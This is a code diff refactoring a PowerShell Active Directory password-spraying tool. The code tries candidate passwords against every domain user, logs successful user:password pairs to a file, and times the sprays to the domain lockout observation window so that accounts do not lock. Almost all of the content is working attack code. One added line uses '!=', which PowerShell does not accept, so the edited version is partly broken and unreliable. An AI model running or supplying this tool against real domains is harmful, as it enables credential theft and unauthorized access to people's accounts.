@@ -82,47 +82,6 @@ function Invoke-DomainPasswordSpray{
      [switch]
      $Force
     )
-
-    function TestPassword($CurrentDomain, $UserListArray, $Password)
-    {
-        $time = Get-Date
-        $count = $UserListArray.count
-        Write-Host "[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())"
-        $curr_user = 0
-
-        ForEach($User in $UserListArray){
-            $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
-            If ($Domain_check.name -ne $null)
-            {
-                if ($OutFile -ne "")
-                {
-                    Add-Content $OutFile $User`:$Password
-                }
-                Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
-            }
-            $curr_user+=1
-            Write-Host -nonewline "$curr_user of $count users tested`r"
-        }
-        Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-        if ($OutFile -ne "")
-        {
-            Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-        }
-    }
-
-    function Get-ObservationWindow()
-    {
-        # Get account lockout observation window to avoid running more than 1
-        # password spray per observation window.
-        $command = "cmd.exe /C net accounts /domain"
-        $net_accounts_results = Invoke-Expression -Command:$command
-        $stripped_policy = ($net_accounts_results | Where-Object {$_ -like "*Lockout Observation Window*"})
-        $stripped_split_a, $stripped_split_b = $stripped_policy.split(':',2)
-        $observation_window_no_spaces = $stripped_split_b -Replace '\s+',""
-        [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)
-        return $observation_window
-    }
-
     if ($Domain -ne "")
     {
         Try
@@ -200,7 +159,7 @@ function Invoke-DomainPasswordSpray{
     Write-Host "[*] Setting a $observation_window minute wait in between sprays."
 
     # if no force flag is set we will ask if the user is sure they want to spray
-    if (!$Force)
+    If (!$Force)
     {
         $title = "Confirm Password Spray"
         $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
@@ -215,45 +174,24 @@ function Invoke-DomainPasswordSpray{
 
         $result = $host.ui.PromptForChoice($title, $message, $options, 0)
 
-        switch ($result)
+        If ($result != 0)
         {
-            0
-            {
-                Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
-                Write-Host "[*] This might take a while depending on the total number of users"
-
-                ForEach($Password_Item in $Passwords)
-                {
-                    TestPassword($CurrentDomain, $UserListArray, $Password_Item)
-                }
-                Countdown-Timer -Seconds (60*$observation_window)
-
-                Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-                if ($OutFile -ne "")
-                {
-                    Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-                }
-            }
-            1 {"Cancelling the password spray."}
+            Write-Host "Cancelling the password spray."
+            break
         }
-        # if the force flag is set we will not bother asking about proceeding with password spray.
-        if($Force)
-        {
-            Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
-            Write-Host "[*] This might take a while depending on the total number of users"
+    }
+    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
+    Write-Host "[*] This might take a while depending on the total number of users"
 
-            ForEach($Password_Item in $Passwords)
-            {
-                TestPassword($CurrentDomain, $UserListArray, $Password_Item)
-                Countdown-Timer -Seconds (60*$observation_window)
-            }
-            Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-            if ($OutFile -ne "")
-            {
-                Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-            }
-
-        }
+    ForEach($Password_Item in $Passwords)
+    {
+        TestPassword($CurrentDomain, $UserListArray, $Password_Item)
+        Countdown-Timer -Seconds (60*$observation_window)
+    }
+    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+    If ($OutFile -ne "")
+    {
+        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
     }
 }
 
@@ -487,3 +425,45 @@ Function Get-DomainUserList{
         Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $UserListArray.count + " users gathered from the current user's domain")
         return $UserListArray
 }
+
+function TestPassword($CurrentDomain, $UserListArray, $Password)
+{
+    $time = Get-Date
+    $count = $UserListArray.count
+    Write-Host "[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())"
+    $curr_user = 0
+    Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"
+
+    ForEach($User in $UserListArray){
+        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
+        If ($Domain_check.name -ne $null)
+        {
+            if ($OutFile -ne "")
+            {
+                Add-Content $OutFile $User`:$Password
+            }
+            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
+        }
+        $curr_user+=1
+        Write-Host -nonewline "$curr_user of $count users tested`r"
+    }
+    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+    if ($OutFile -ne "")
+    {
+        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
+    }
+}
+
+function Get-ObservationWindow()
+{
+    # Get account lockout observation window to avoid running more than 1
+    # password spray per observation window.
+    $command = "cmd.exe /C net accounts /domain"
+    $net_accounts_results = Invoke-Expression -Command:$command
+    $stripped_policy = ($net_accounts_results | Where-Object {$_ -like "*Lockout Observation Window*"})
+    $stripped_split_a, $stripped_split_b = $stripped_policy.split(':',2)
+    $observation_window_no_spaces = $stripped_split_b -Replace '\s+',""
+    [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)
+    return $observation_window
+}
+
